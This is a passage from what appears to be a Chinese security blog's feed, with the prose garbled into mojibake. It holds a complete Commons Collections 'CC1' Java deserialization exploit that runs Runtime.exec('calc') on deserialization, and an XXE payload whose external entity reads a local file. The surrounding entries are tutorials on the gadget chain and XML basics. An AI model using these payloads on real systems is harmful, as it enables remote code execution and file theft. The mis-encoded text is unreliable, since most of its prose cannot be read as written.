ä¸€ä¸ªåŸå§‹çš„Runtimeå°±è¡Œï¼Œå› ä¸ºå…¶ä»–éƒ½æ˜¯åµŒå¥—çš„ã€‚</span></span><br><span class="line">     ChainedTransformer chainedTransformer= <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(Transformers);</span><br><span class="line">     chainedTransformer.transform(Runtime.class);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åŒæ ·å¯ä»¥è¿è¡Œ</p><h3 id="è§£å†³setValue-æ–¹æ³•æ— æ³•æ‰§è¡Œçš„åŸå› "><a href="#è§£å†³setValue-æ–¹æ³•æ— æ³•æ‰§è¡Œçš„åŸå› " class="headerlink" title="è§£å†³setValue()æ–¹æ³•æ— æ³•æ‰§è¡Œçš„åŸå› "></a><strong>è§£å†³setValue()æ–¹æ³•æ— æ³•æ‰§è¡Œçš„åŸå› </strong></h3><p>setValue()æ–¹æ³•æ˜¯åœ¨ä¸¤ä¸ªifè¯­å¥ä¸‹è¾¹</p><p><img src="https://raw.githubusercontent.com/Gu0f3n/img/mian/e333e860070dd6d46ab0d3bfcd2a90f.png"></p><p>æ‰€ä»¥æˆ‘ä»¬éœ€è¦ç»•è¿‡è¿™ä¸¤ä¸ªifè¯­å¥æ‰èƒ½æ‰§è¡Œ</p><p>ç¬¬ä¸€ä¸ªifå°±æ˜¯åˆ¤æ–­ç±»å‹è¦ä¸ä¸ºç©º</p><p>ç¬¬äºŒä¸ªif</p><p>memberType.isInstance(value) || value instanceof ExceptionProxyï¼šè¡¨ç¤º value æ˜¯ memberType ç±»å‹çš„å®ä¾‹ï¼Œæˆ–è€…æ˜¯ ExceptionProxy ç±»å‹ã€‚</p><p>!()ï¼šå¯¹æ•´ä¸ªæ¡ä»¶å–åã€‚ï¼Œå¦‚æœ value æ—¢ä¸æ˜¯ memberType çš„å®ä¾‹ï¼Œä¹Ÿä¸æ˜¯ ExceptionProxyï¼Œæ¡ä»¶ä¸ºçœŸï¼Œè¿›å…¥ if å—ã€‚</p><h3 id="è§£å†³æ— æ³•æ§åˆ¶setValueå€¼çš„é—®é¢˜"><a href="#è§£å†³æ— æ³•æ§åˆ¶setValueå€¼çš„é—®é¢˜" class="headerlink" title="è§£å†³æ— æ³•æ§åˆ¶setValueå€¼çš„é—®é¢˜"></a><strong><strong>è§£å†³æ— æ³•æ§åˆ¶setValueå€¼çš„é—®é¢˜</strong></strong></h3><p>å¤„ç†å®Œifå‘ç°ä¼ è¿›å»çš„å‚æ•°æˆ‘ä»¬ä¸å¯æ§</p><p>è¿™é‡Œéœ€è¦å€ŸåŠ©å¦ä¸€ä¸ªç±»ConstantTransformerï¼›è¿™ä¸ªç±»éå¸¸æœ‰æ„æ€ï¼Œæ„é€ æ–¹æ³•ä¼ é€’ä»€ä¹ˆå€¼ï¼Œtransformå°±è¿”å›ä»€ä¹ˆå€¼</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">ConstantTransformer</span><span class="params">(Object constantToReturn)</span> &#123;</span><br><span class="line">    <span class="built_in">super</span>();</span><br><span class="line">    iConstant = constantToReturn;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> Object <span class="title function_">transform</span><span class="params">(Object input)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> iConstant;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>POC</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.Target;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationTargetException;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">cc1</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException, InvocationTargetException, IllegalAccessException, NoSuchMethodException, ClassNotFoundException, InstantiationException &#123;</span><br><span class="line"></span><br><span class="line">        Transformer[] transformers = &#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        HashMap&lt;Object, Object&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        hashMap.put(<span class="string">&quot;value&quot;</span>,<span class="string">&quot;deadbeef&quot;</span>);</span><br><span class="line">        Map&lt;Object,Object&gt; transformedMap = TransformedMap.decorate(hashMap, <span class="literal">null</span>, chainedTransformer);</span><br><span class="line"></span><br><span class="line">        Class&lt;?&gt; clazz = Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        Constructor&lt;?&gt; annotationInvocationHandler = clazz.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">        annotationInvocationHandler.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> annotationInvocationHandler.newInstance(Target.class,transformedMap);</span><br><span class="line"></span><br><span class="line">        serialize(o);</span><br><span class="line">        unserialize();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>));</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">        oos.close();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">unserialize</span><span class="params">()</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;ser.bin&quot;</span>));</span><br><span class="line">        ois.readObject();</span><br><span class="line">        ois.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;â€‹    &lt;/p&gt;
&lt;p&gt;ç¯å¢ƒæ­å»ºä¸è¯´äº† ç½‘ä¸Šå¾ˆå¤šä¼˜ç§€çš„æ–‡ç« æ•™å­¦&lt;/p&gt;
&lt;p&gt;å…ˆåˆ—å‡ºåˆ©ç”¨çš„é“¾å­ç„¶åæˆ‘ä»¬éœ€è¦å€’ç€è¿›è¡Œåˆ†æ&lt;/p&gt;
&lt;figure class=&quot;highlight plaintext&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;sp</summary>
      
    
    
    
    <category term="java" scheme="https://gu0f3n.github.io/categories/java/"/>
    
    
    <category term="java" scheme="https://gu0f3n.github.io/tags/java/"/>
    
  </entry>
  
  <entry>
    <title>xxeæ¼æ´</title>
    <link href="https://gu0f3n.github.io/2025/03/10/xxe%E6%BC%8F%E6%B4%9E/"/>
    <id>https://gu0f3n.github.io/2025/03/10/xxe%E6%BC%8F%E6%B4%9E/</id>
    <published>2025-03-10T13:47:11.000Z</published>
    <updated>2025-03-20T10:13:17.972Z</updated>
    
    <content type="html"><![CDATA[<h3 id="XMLåŸºç¡€"><a href="#XMLåŸºç¡€" class="headerlink" title="XMLåŸºç¡€"></a><strong>XMLåŸºç¡€</strong></h3><p><a href="https://so.csdn.net/so/search?q=XML%E6%96%87%E6%A1%A3&spm=1001.2101.3001.7020">XMLæ–‡æ¡£</a>ç»“æ„åŒ…æ‹¬XMLå£°æ˜ã€DTDæ–‡æ¡£ç±»å‹å®šä¹‰ï¼ˆå¯é€‰ï¼‰ã€æ–‡æ¡£å…ƒç´ ã€‚</p><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!--XMLç”³æ˜--&gt;</span></span><br><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span>?&gt;</span> </span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!--æ–‡æ¡£ç±»å‹å®šä¹‰--&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">note</span> [  &lt;!--å®šä¹‰æ­¤æ–‡æ¡£æ˜¯ note ç±»å‹çš„æ–‡æ¡£--&gt;</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ELEMENT <span class="keyword">note</span> (<span class="keyword">to</span>,<span class="keyword">from</span>,<span class="keyword">heading</span>,<span class="keyword">body</span>)&gt;</span>  &lt;!--å®šä¹‰noteå…ƒç´ æœ‰å››ä¸ªå…ƒç´ --&gt;</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ELEMENT <span class="keyword">to</span> (<span class="keyword">#PCDATA</span>)&gt;</span>     &lt;!--å®šä¹‰toå…ƒç´ ä¸ºâ€#PCDATAâ€ç±»å‹--&gt;</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ELEMENT <span class="keyword">from</span> (<span class="keyword">#PCDATA</span>)&gt;</span>   &lt;!--å®šä¹‰fromå…ƒç´ ä¸ºâ€#PCDATAâ€ç±»å‹--&gt;</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ELEMENT <span class="keyword">head</span> (<span class="keyword">#PCDATA</span>)&gt;</span>   &lt;!--å®šä¹‰headå…ƒç´ ä¸ºâ€#PCDATAâ€ç±»å‹--&gt;</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ELEMENT <span class="keyword">body</span> (<span class="keyword">#PCDATA</span>)&gt;</span>   &lt;!--å®šä¹‰bodyå…ƒç´ ä¸ºâ€#PCDATAâ€ç±»å‹--&gt;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!--æ–‡æ¡£å…ƒç´ --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">note</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">to</span>&gt;</span>Dave<span class="tag">&lt;/<span class="name">to</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">from</span>&gt;</span>Tom<span class="tag">&lt;/<span class="name">from</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span>Reminder<span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span>You are a good man<span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">note</span>&gt;</span></span><br></pre></td></tr></table></figure><p>å¤§ç™½è¯è§£é‡Šä¸‹</p><h3 id="å¤§ç™½è¯ç‰ˆXMLåŸºç¡€è®²è§£"><a href="#å¤§ç™½è¯ç‰ˆXMLåŸºç¡€è®²è§£" class="headerlink" title="å¤§ç™½è¯ç‰ˆXMLåŸºç¡€è®²è§£"></a><strong>å¤§ç™½è¯ç‰ˆXMLåŸºç¡€è®²è§£</strong></h3><hr><h4 id="1-XMLæ˜¯å•¥ï¼Ÿ"><a href="#1-XMLæ˜¯å•¥ï¼Ÿ" class="headerlink" title="1. XMLæ˜¯å•¥ï¼Ÿ"></a><strong>1. XMLæ˜¯å•¥ï¼Ÿ</strong></h4><p>XMLå…¨ç§°<strong>å¯æ‰©å±•æ ‡è®°è¯­è¨€</strong>ï¼Œä½ å¯ä»¥æŠŠå®ƒç†è§£æˆä¸€ç§<strong>â€œçº¯æ–‡æœ¬ç‰ˆçš„æ•°æ®æ”¶çº³ç›’â€</strong>ã€‚å®ƒçš„æ ¸å¿ƒä½œç”¨æ˜¯<strong>å­˜å‚¨å’Œä¼ è¾“ç»“æ„åŒ–çš„æ•°æ®</strong>ï¼Œæ¯”å¦‚å•†å“ä¿¡æ¯ã€ç”¨æˆ·èµ„æ–™ç­‰ã€‚ä¸¾ä¸ªæ —å­ğŸŒ°ï¼š</p><ul><li><strong>HTML</strong>ï¼ˆç½‘é¡µè¯­è¨€ï¼‰ï¼šè´Ÿè´£æŠŠæ•°æ®æ’ç‰ˆæˆå¥½çœ‹çš„é¡µé¢ï¼Œæ¯”å¦‚å­—ä½“é¢œè‰²ã€è¡¨æ ¼å¸ƒå±€ã€‚</li><li><strong>XML</strong>ï¼šåªå…³å¿ƒæ•°æ®æœ¬èº«é•¿å•¥æ ·ï¼Œæ¯”å¦‚ä¸€ä¸ªå•†å“çš„åå­—ã€ä»·æ ¼ã€åº“å­˜é‡ã€‚</li></ul><blockquote><p>ğŸ“Œ <strong>å…³é”®ç‰¹ç‚¹</strong>ï¼šæ ‡ç­¾å¯ä»¥è‡ªå®šä¹‰ï¼ˆæ¯”å¦‚ <code>&lt;æ‰‹æœºå‹å·&gt;å°ç±³13&lt;/æ‰‹æœºå‹å·&gt;</code>ï¼‰ï¼Œä¸åƒHTMLåªèƒ½ç”¨å›ºå®šæ ‡ç­¾ï¼ˆå¦‚ <code>&lt;p&gt;</code>ï¼‰</p><p><strong>1</strong></p><p><strong>3</strong></p><p><strong>5</strong></p><p>ã€‚</p></blockquote><hr><h4 id="2-XMLé•¿ä»€ä¹ˆæ ·ï¼Ÿ"><a href="#2-XMLé•¿ä»€ä¹ˆæ ·ï¼Ÿ" class="headerlink" title="2. XMLé•¿ä»€ä¹ˆæ ·ï¼Ÿ"></a><strong>2. XMLé•¿ä»€ä¹ˆæ ·ï¼Ÿ</strong></h4><p>XMLæ–‡æ¡£å°±åƒ<strong>å®¶è°±</strong>ï¼Œå¿…é¡»æœ‰ä¸€ä¸ª<strong>â€œè€ç¥–å®—â€æ ¹æ ‡ç­¾</strong>ï¼Œå…¶ä»–æ ‡ç­¾å±‚å±‚åµŒå¥—ã€‚æ¯”å¦‚ï¼š</p><p>xml</p><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span>  <span class="comment">&lt;!-- æ–‡æ¡£å£°æ˜ï¼ˆå‘Šè¯‰ç”µè„‘è¿™æ˜¯XMLï¼‰ --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">è¶…å¸‚</span>&gt;</span>  <span class="comment">&lt;!-- æ ¹æ ‡ç­¾ --&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">å•†å“</span> <span class="attr">åˆ†ç±»</span>=<span class="string">&quot;é¥®æ–™&quot;</span>&gt;</span>  <span class="comment">&lt;!-- å­æ ‡ç­¾ï¼Œå¸¦å±æ€§ --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">åç§°</span>&gt;</span>å¯ä¹<span class="tag">&lt;/<span class="name">åç§°</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">ä»·æ ¼</span>&gt;</span>3.5<span class="tag">&lt;/<span class="name">ä»·æ ¼</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">åº“å­˜</span>&gt;</span>100<span class="tag">&lt;/<span class="name">åº“å­˜</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">å•†å“</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">è¶…å¸‚</span>&gt;</span></span><br></pre></td></tr></table></figure><ul><li><?xml version="1.0" encoding="UTF-8"?>  <!-- æ–‡æ¡£å£°æ˜ï¼ˆå‘Šè¯‰ç”µè„‘è¿™æ˜¯XMLï¼‰ -->&lt;è¶…å¸‚&gt;  <!-- æ ¹æ ‡ç­¾ --><br>  &lt;å•†å“ åˆ†ç±»&#x3D;â€é¥®æ–™â€&gt;  <!-- å­æ ‡ç­¾ï¼Œå¸¦å±æ€§ --><br>&lt;åç§°&gt;å¯ä¹&lt;&#x2F;åç§°&gt;<br>&lt;ä»·æ ¼&gt;3.5&lt;&#x2F;ä»·æ ¼&gt;<br>&lt;åº“å­˜&gt;100&lt;&#x2F;åº“å­˜&gt;<br>  &lt;&#x2F;å•†å“&gt;<br>&lt;&#x2F;è¶…å¸‚&gt;</li></ul><hr><h4 id="3-XMLçš„è§„çŸ©ï¼ˆè¯­æ³•ï¼‰"><a href="#3-XMLçš„è§„çŸ©ï¼ˆè¯­æ³•ï¼‰" class="headerlink" title="3. XMLçš„è§„çŸ©ï¼ˆè¯­æ³•ï¼‰"></a><strong>3. XMLçš„è§„çŸ©ï¼ˆè¯­æ³•ï¼‰</strong></h4><p>3.XMLçš„è§„çŸ© (è¯­æ³•)<br>1.ä¸¥æ ¼å¤§å°å†™ï¼š<Price>å’Œ<price>æ˜¯ä¿©ä¸åŒçš„æ ‡ç­¾ï¼Œç”µè„‘ä¼šè®¤é”™68ã€‚<br>2.ä¸èƒ½çèµ·åï¼š<br>ï¼‰Ã—ä¸èƒ½ç”¨æ•°å­—å¼€å¤´ï¼ˆå¦‚1&lt;1å·å•†å“&gt;<br>Â·Ã—ä¸èƒ½æœ‰ç©ºæ ¼ï¼ˆå¦‚&lt;å•†å“åç§°&gt;ï¼‰<br>Â·Ã—åˆ«ç”¨ç‰¹æ®Šç¬¦å·ï¼ˆå¦‚ï¼šæˆ–-ï¼‰<br>3.èº²å¼€ç‰¹æ®Šå­—ç¬¦ï¼šæ¯”å¦‚&lt;è¦å†™æˆ&amp;ltï¼›ï¼Œå¦åˆ™ç”µè„‘ä¼šä»¥ä¸ºæ˜¯æ–°æ ‡ç­¾ã€‚<br>4.æ³¨é‡Šå†™æ³•ï¼š<!--è¿™æ˜¯æ³¨é‡Š-->ï¼Œä¸èƒ½åµŒå¥—ã€‚</p><hr><h4 id="4-XMLèƒ½å¹²å•¥ç”¨ï¼Ÿ"><a href="#4-XMLèƒ½å¹²å•¥ç”¨ï¼Ÿ" class="headerlink" title="4. XMLèƒ½å¹²å•¥ç”¨ï¼Ÿ"></a><strong>4. XMLèƒ½å¹²å•¥ç”¨ï¼Ÿ</strong></h4><p>1. </p><p>   ä¼ æ•°æ®</p><p>   ï¼šæ¯”å¦‚APPå’ŒæœåŠ¡å™¨ä¹‹é—´ä¼ è®¢å•ä¿¡æ¯ï¼Œç”¨XMLæ‰“åŒ…æ•°æ®ï¼ŒåŒæ–¹éƒ½èƒ½çœ‹æ‡‚</p><p>   <strong>3</strong></p><p>   <strong>7</strong></p><p>   ã€‚</p><p>2. </p><p>   å½“é…ç½®æ–‡ä»¶</p><p>   ï¼šå¾ˆå¤šè½¯ä»¶çš„è®¾ç½®æ–‡ä»¶ï¼ˆæ¯”å¦‚Javaçš„Springæ¡†æ¶ï¼‰ç”¨XMLå­˜å‚æ•°</p><p>   <strong>3</strong></p><p>   <strong>8</strong></p><p>   ã€‚</p><p>3. </p><p>   å°å‹æ•°æ®åº“</p><p>   ï¼šæ¯”å¦‚å­˜å‡ ç™¾æœ¬ä¹¦çš„ä¿¡æ¯ï¼Œæ–¹ä¾¿éšæ—¶è¯»å–</p><p>   <strong>3</strong></p><p>   <strong>4</strong></p><p>   ã€‚</p><p>4. </p><p>   è§„èŒƒæ•°æ®æ ¼å¼</p><p>   ï¼šæ¯”å¦‚ç”µå•†å¹³å°è¦æ±‚æ‰€æœ‰å•†å®¶ç”¨ç»Ÿä¸€çš„XMLæ ¼å¼ä¸Šä¼ å•†å“</p><p>   <strong>4</strong></p><p>   <strong>7</strong></p><p>   ã€‚</p><hr><h4 id="5-ä¸¾ä¸ªå®é™…ä¾‹å­"><a href="#5-ä¸¾ä¸ªå®é™…ä¾‹å­" class="headerlink" title="5. ä¸¾ä¸ªå®é™…ä¾‹å­"></a><strong>5. ä¸¾ä¸ªå®é™…ä¾‹å­</strong></h4><p>å‡è®¾ä½ è¦ç”¨XMLå­˜å­¦ç”Ÿä¿¡æ¯ï¼š</p><p>xml</p><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">ç­çº§</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">å­¦ç”Ÿ</span> <span class="attr">å­¦å·</span>=<span class="string">&quot;001&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">å§“å</span>&gt;</span>å¼ ä¸‰<span class="tag">&lt;/<span class="name">å§“å</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">å¹´é¾„</span>&gt;</span>18<span class="tag">&lt;/<span class="name">å¹´é¾„</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">æˆç»©</span>&gt;</span>90<span class="tag">&lt;/<span class="name">æˆç»©</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">å­¦ç”Ÿ</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">å­¦ç”Ÿ</span> <span class="attr">å­¦å·</span>=<span class="string">&quot;002&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">å§“å</span>&gt;</span>æå››<span class="tag">&lt;/<span class="name">å§“å</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">å¹´é¾„</span>&gt;</span>19<span class="tag">&lt;/<span class="name">å¹´é¾„</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">æˆç»©</span>&gt;</span>85<span class="tag">&lt;/<span class="name">æˆç»©</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">å­¦ç”Ÿ</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">ç­çº§</span>&gt;</span></span><br></pre></td></tr></table></figure><ul><li><strong>æ ¹æ ‡ç­¾</strong>ï¼š<code>&lt;ç­çº§&gt;</code></li><li><strong>åµŒå¥—ç»“æ„</strong>ï¼šæ¯ä¸ªå­¦ç”Ÿä¿¡æ¯åŒ…è£¹åœ¨ <code>&lt;å­¦ç”Ÿ&gt;</code> é‡Œï¼Œå±æ€§ <code>å­¦å·</code> åŒºåˆ†ä¸åŒå­¦ç”Ÿ</li></ul><p><strong>XML &#x3D; è‡ªå®šä¹‰æ ‡ç­¾ + ç»“æ„åŒ–æ•°æ® + ä¸¥æ ¼è¯­æ³•</strong>ã€‚å®ƒåƒä¸€å¼ ä¸‡èƒ½è¡¨æ ¼ï¼Œèƒ½æŠŠæ‚ä¹±çš„æ•°æ®æ•´ç†å¾—äº•äº•æœ‰æ¡ï¼Œæ–¹ä¾¿ç”µè„‘å’Œäººä¸€èµ·çœ‹æ‡‚ã€‚å­¦XMLçš„é‡ç‚¹æ˜¯ï¼š<strong>æ ‡ç­¾åˆ«å†™é”™ã€å±æ€§åŠ å¼•å·ã€ç»“æ„è¦æ¸…æ™°</strong>ï¼</p><h5 id="xmlè¯­è¨€çš„æ ¼å¼"><a href="#xmlè¯­è¨€çš„æ ¼å¼" class="headerlink" title="xmlè¯­è¨€çš„æ ¼å¼"></a>xmlè¯­è¨€çš„æ ¼å¼</h5><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span>   //xmlçš„å£°æ˜  </span><br><span class="line"> <span class="meta">&lt;!DOCTYPE <span class="keyword">foo</span> [ </span></span><br><span class="line"><span class="meta"> <span class="meta">&lt;!ELEMENT <span class="keyword">foo</span> <span class="keyword">ANY</span> &gt;</span></span></span><br><span class="line"><span class="meta"> <span class="meta">&lt;!ENTITY <span class="keyword">xxe</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file://d:/1.txt&quot;</span> &gt;</span></span></span><br><span class="line"><span class="meta"> ]&gt;</span>                                      //DTDéƒ¨åˆ†</span><br><span class="line"><span class="tag">&lt;<span class="name">x</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">x</span>&gt;</span>                          //xmléƒ¨åˆ†</span><br></pre></td></tr></table></figure><p>é¦–å…ˆç¬¬ä¸€å¥æ˜¯å£°æ˜ï¼Œå£°æ˜è¿™æ˜¯ä¸€æ®µxmlä»£ç ï¼Œæ¥ä¸‹æ¥æ˜¯ä¸€ä¸ªDTDçš„éƒ¨åˆ†ï¼Œæ„æ€æ˜¯è¯»å–dç›˜ä¸Šçš„1.txtæ–‡ä»¶ã€‚æ¯”å¦‚æˆ‘ä»¬ç»å¸¸è¦ç”¨åˆ°æŸä¸€ç»„æ•°æ®ï¼Œé‚£ä¹ˆæ¯æ¬¡éƒ½å¼•ç”¨ï¼Œè‚¯å®šæ˜¯éå¸¸ä¸æ–¹ä¾¿çš„ï¼Œæ‰€ä»¥æŠŠè¿™ç»„ç»å¸¸ç”¨çš„æ•°æ®è®¾ç½®æˆä¸ºä¸€ä¸ªå˜é‡ï¼Œéœ€è¦çš„æ—¶å€™ç›´æ¥è°ƒç”¨è¿™ä¸ªå˜é‡ï¼Œé€šè¿‡ä»¥ä¸Šçš„è§£é‡Šï¼Œæˆ‘ä»¬ä¸éš¾çœ‹å‡ºï¼Œxmlå¦‚æœäº§ç”Ÿæ¼æ´ï¼Œé‚£è‚¯å®šå°±æ˜¯åœ¨è¿™ä¸ªDTDéƒ¨åˆ†ï¼Œæœ€ååˆ™æ˜¯xmléƒ¨åˆ†ã€‚</p><p>ä¸€é“javaé¢˜ç›®ç»“åˆxxeæ¼æ´</p><h5 id="CVE-2019-12415"><a href="#CVE-2019-12415" class="headerlink" title="CVE-2019-12415"></a>CVE-2019-12415</h5><p>ä¹‹å‰åˆ·é¢˜ç½‘é¼æ¯ç¢°åˆ°çš„ é¡ºä¾¿å¤ä¹ äº†ä¸‹xxeï¼ˆå¤–éƒ¨å®ä½“æ³¨å…¥æ¼æ´ï¼‰</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h3 id=&quot;XMLåŸºç¡€&quot;&gt;&lt;a href=&quot;#XMLåŸºç¡€&quot; class=&quot;headerlink&quot; title=&quot;XMLåŸºç¡€&quot;&gt;&lt;/a&gt;&lt;strong&gt;XMLåŸºç¡€&lt;/strong&gt;&lt;/h3&gt;&lt;p&gt;&lt;a href=&quot;https://so.csdn.net/so/search?q=</summary>
      
    
    
    
    
    <category term="xxe" scheme="https://gu0f3n.github.io/tags/xxe/"/>
    
  </entry>
  
  <entry>
    <title>è·Ÿç€å°è¿ªçš„ç¬¬å››å¤©</title>
    <link href="https://gu0f3n.github.io/2025/03/09/%E8%B7%9F%E7%9D%80%E5%B0%8F%E8%BF%AA%E7%9A%84%E7%AC%AC%E5%9B%9B%E5%A4%A9/"/>
    <id>https://gu0f3n.github.io/2025/03/09/%E8%B7%9F%E7%9D%80%E5%B0%8F%E8%BF%AA%E7%9A%84%E7%AC%AC%E5%9B%9B%E5%A4%A9/</id>
    <published>2025-03-09T03:24:40.000Z</published>
    <updated>2025-03-20T10:15:03.242Z</updated>
    
